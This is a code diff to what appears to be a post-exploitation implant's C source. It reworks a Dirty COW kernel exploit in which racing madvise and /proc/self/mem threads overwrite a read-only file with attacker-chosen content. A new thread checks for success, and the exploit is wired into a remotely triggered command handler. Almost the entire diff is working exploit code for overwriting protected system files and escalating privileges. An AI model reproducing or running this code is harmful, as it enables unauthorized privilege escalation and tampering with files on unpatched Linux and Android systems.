@@ -92,22 +92,57 @@ struct tlv_packet *sys_config_sysinfo(struct tlv_handler_ctx *ctx)
 	return p;
 }
 
-/*#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); fflush(stdout); }*/
-#define LOGV(...) 
-
-#define LOOP   0x10000
-
-#define PAGE_SIZE 4096
+/*#define LOGV(...)   0x100000*/
+#define LOOP   0x100000
+#define TIMEOUT 10
 
 struct mem_arg  {
-	void *map;
+	void *offset;
 	void *patch;
 	size_t patch_size;
-	size_t offset;
-	int count;
-	int count2;
+	const char *fname;
+	volatile int stop;
+	int success;
 };
 
+static void *checkThread(void *arg) {
+	struct mem_arg *mem_arg;
+	mem_arg = (struct mem_arg *)arg;
+	struct stat st;
+	int i;
+	char * newdata = malloc(mem_arg->patch_size);
+	for(i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
+		int f=open(mem_arg->fname, O_RDONLY);
+		if (f == -1) {
+			/*LOGV("could not open %s", mem_arg->fname);*/
+			break;
+		}
+		if (fstat(f,&st) == -1) {
+			/*LOGV("could not stat %s", mem_arg->fname);*/
+			close(f);
+			break;
+		}
+			/*LOGV("could not stat %s", mem_arg->fname);*/
+		if (read(f, newdata, mem_arg->patch_size) == -1) {
+			break;;
+		}
+		close(f);
+
+		int memcmpret = memcmp(newdata, mem_arg->patch, mem_arg->patch_size);
+		/*LOGV("ret %d", memcmpret);*/
+		if (memcmpret == 0) {
+			mem_arg->stop = 1;
+			mem_arg->success = 1;
+			free(newdata);
+			return 0;
+		}
+		/*LOGV("sleep not stat");*/
+		usleep(100 * 1000);
+	}
+	mem_arg->stop = 1;
+	free(newdata);
+	return 0;
+}
 static void *madviseThread(void *arg)
 {
 	struct mem_arg *mem_arg;
@@ -119,131 +154,162 @@ static void *madviseThread(void *arg)
 	size = mem_arg->patch_size;
 	addr = (void *)(mem_arg->offset);
 
-	/*LOGV("[*] madvise = %p %d", addr, size);*/
+	/*LOGV("[*] madvise = %p %zd", addr, size);*/
 
-	for(i = 0; i < LOOP; i++) {
+	for(i = 0; i < LOOP && !mem_arg->stop; i++) {
 		c += madvise(addr, size, MADV_DONTNEED);
 	}
 
-	mem_arg->count = c;
-
 	/*LOGV("[*] madvise = %d %d", c, i);*/
+	mem_arg->stop = 1;
 	return 0;
 }
 
 static void *procselfmemThread(void *arg)
 {
 	struct mem_arg *mem_arg;
-	mem_arg = (struct mem_arg *)arg;
-
 	int fd, i, c = 0;
-	void *p = (void*)mem_arg->patch;
-
-	off_t fuck = (off_t)mem_arg->offset;
+	mem_arg = (struct mem_arg *)arg;
+	unsigned char *p = mem_arg->patch;
+	off_t offset = (off_t)(mem_arg->offset - (void*)0);
 
 	fd = open("/proc/self/mem", O_RDWR);
-	if (fd == -1)
+	if (fd == -1) {
 		/*LOGV("open(\"/proc/self/mem\"");*/
+		/*mem_arg->stop = 1;*/
+	}
 
-	for (i = 0; i < LOOP; i++) {
-		lseek(fd, (off_t)fuck, SEEK_SET);
+	for (i = 0; i < LOOP && !mem_arg->stop; i++) {
+		lseek(fd, offset, SEEK_SET);
 		c += write(fd, p, mem_arg->patch_size);
 	}
 
-	/*LOGV("[*] /proc/self/mem %d %i", c, i);*/
+  /*LOGV("[*] /proc/self/mem %d %i", c, i);*/
 
 	close(fd);
-	mem_arg->count2 = c;
+
+	mem_arg->stop = 1;
 	return 0;
 }
 
-static int dcow(const char* filefrom, const char* fileto) {
+static void exploit(struct mem_arg *mem_arg)
+{
+	pthread_t pth1, pth2, pth3;
+
+	/*LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);*/
+
+	mem_arg->stop = 0;
+	mem_arg->success = 0;
+	pthread_create(&pth3, NULL, checkThread, mem_arg);
+	pthread_create(&pth1, NULL, madviseThread, mem_arg);
+	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);
+
+	pthread_join(pth3, NULL);
+	pthread_join(pth1, NULL);
+	pthread_join(pth2, NULL);
+
+	/*LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);*/
+}
+
+int rundcow(const char * fromfile, const char * tofile)
+{
+	/*char * fromfile = argv[1];*/
+	/*char * tofile = argv[2];*/
 	struct mem_arg mem_arg;
 	struct stat st;
 	struct stat st2;
 
-	int f=open(fileto,O_RDONLY);
+	int f=open(tofile,O_RDONLY);
 	if (f == -1) {
-		/*LOGV("could not open %s", argv[1]);*/
-		return 1;
+		/*LOGV("could not open %s", tofile);*/
+		return 0;
 	}
 	if (fstat(f,&st) == -1) {
-		/*LOGV("could not open %s", argv[1]);*/
-		return 2;
+		/*LOGV("could not open %s", tofile);*/
+		close(f);
+		return 1;
 	}
 
-	int f2=open(filefrom,O_RDONLY);
+	int f2=open(fromfile,O_RDONLY);
 	if (f2 == -1) {
-		/*LOGV("could not open %s", argv[2]);*/
-		return 3;
+		/*LOGV("could not open %s", fromfile);*/
+		return 2;
 	}
 	if (fstat(f2,&st2) == -1) {
-		/*LOGV("could not open %s", argv[2]);*/
-		return 4;
+		/*LOGV("could not open %s", fromfile);*/
+		close(f);
+		close(f2);
+		return 3;
 	}
 
 	size_t size = st.st_size;
 	if (st2.st_size != st.st_size) {
-		/*LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st2.st_size, st.st_size);*/
-		if (st2.st_size > size) {
-			size = st2.st_size;
-		}
-	}
-	if (size == 0) {
-		return 1337;
+		/*LOGV("warning: new file size (%zd) and file old size (%zd) differ\n", st.st_size, st2.st_size);*/
 	}
 
-	/*LOGV("size %d\n\n",size);*/
+	if (st2.st_size > size) {
+		size = st2.st_size;
+	}
+	/*LOGV("size %zd\n\n", size);*/
 
 	mem_arg.patch = malloc(size);
 	if (mem_arg.patch == NULL) {
-		return 5;
+		free(mem_arg.patch);
+		close(f);
+		close(f2);
+		return 4;
 	}
 
 	memset(mem_arg.patch, 0, size);
+	if (read(f2, mem_arg.patch, st2.st_size) == -1) {
+		free(mem_arg.patch);
+		close(f);
+		close(f2);
+		return 5;
+	}
 
-	int readret = read(f2, mem_arg.patch, st2.st_size);
 	close(f2);
 
+	/*read(f, mem_arg.unpatch, st.st_size);*/
+
 	mem_arg.patch_size = size;
+	mem_arg.fname = tofile;
 
 	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
 	if (map == MAP_FAILED) {
+		/*LOGV("mmap");*/
+		free(mem_arg.patch);
+		close(f);
 		return 6;
 	}
 
-	/*LOGV("[*] mmap %", asdfkasldfj);*/
+	/*LOGV("[*] mmap %p", map);*/
 
-	mem_arg.map = map;
+	mem_arg.offset = map;
 
-	pthread_t pth1, pth2;
-	pthread_create(&pth1, NULL, madviseThread, &mem_arg);
-	pthread_create(&pth2, NULL, procselfmemThread, &mem_arg);
-	pthread_join(pth1, NULL);
-	pthread_join(pth2, NULL);
-
-	/*LOGV("[*] putting back %p", map);*/
+	exploit(&mem_arg);
+	free(mem_arg.patch);
+	close(f);
+	// to put back
 	/*exploit(&mem_arg, 0);*/
 
-	close(f);
-
-	return size;
+	return mem_arg.success;
 }
 
 struct tlv_packet *sys_config_dcow(struct tlv_handler_ctx *ctx)
 {
 	const char *lib_path = tlv_packet_get_str(ctx->req, TLV_TYPE_LIBRARY_PATH);
 	const char *target_path = tlv_packet_get_str(ctx->req, TLV_TYPE_TARGET_PATH);
-	int ret = dcow(lib_path, target_path);
+	int ret = rundcow(lib_path, target_path);
 	char * result = 0;
-	int vasresult = asprintf(&result, "dcow (%d)", ret);
+	int vasresult = asprintf(&result, "ncow (%d)", ret);
 	if (vasresult == -1) {
 		return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
 	}
 	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
 	return tlv_packet_add_str(p, TLV_TYPE_LOCAL_DATETIME, result);
 }
-
+	
 struct tlv_packet *sys_config_localtime(struct tlv_handler_ctx *ctx)
 {
 	char dateTime[128] = { 0 };
@@ -252,7 +318,7 @@ struct tlv_packet *sys_config_localtime(struct tlv_handler_ctx *ctx)
 	localtime_r(&t, &lt);
 	strftime(dateTime, sizeof(dateTime) - 1, "%Y-%m-%d %H:%M:%S %Z (UTC%z)", &lt);
 	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
-	return tlv_packet_add_fmt(p, TLV_TYPE_LOCAL_DATETIME, dateTime);
+	return tlv_packet_add_str(p, TLV_TYPE_LOCAL_DATETIME, dateTime);
 }
 
 void sys_config_register_handlers(struct mettle *m)
